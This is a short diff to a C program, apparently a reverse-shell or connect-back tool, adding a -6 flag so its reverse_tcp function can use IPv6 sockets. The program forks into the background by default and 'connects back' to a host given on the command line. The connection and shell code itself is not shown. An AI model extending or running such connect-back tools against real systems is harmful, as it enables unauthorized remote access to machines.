@@ -19,10 +19,11 @@ static void usage()
 	fprintf(stderr, "options:\n");
 	fprintf(stderr, "\t-h : display this and exit\n");
 	fprintf(stderr, "\t-f : foreground mode (eg: no fork)\n");
+	fprintf(stderr, "\t-6 : use IPv6 socket\n");
 }
 
 
-static void reverse_tcp(const char *host, const char *port)
+static void reverse_tcp(const char *host, const char *port, int family)
 {
 	int		sockfd;
 	struct addrinfo	hints;
@@ -65,8 +66,9 @@ int main(int argc, char *argv[])
 	int	c;
 	int	nofork = 0;
 	pid_t	child;
+	int		family = AF_INET;
 
-	while ( (c = getopt(argc, argv, "hf")) != -1 )
+	while ( (c = getopt(argc, argv, "hf6")) != -1 )
 	{
 		switch ( c )
 		{
@@ -76,6 +78,10 @@ int main(int argc, char *argv[])
 
 			case 'f':
 			nofork = 1;
+			break;
+
+			case '6':
+			family = AF_INET6;
 			break;
 		}
 	}
@@ -92,7 +98,7 @@ int main(int argc, char *argv[])
 	/* Fork and connect back
 	 */
 	if ( nofork || (child = fork()) == 0 )
-		reverse_tcp(argv[0], argv[1]);
+		reverse_tcp(argv[0], argv[1], family);
 	else
 		printf("child pid: %d\n", child);
 
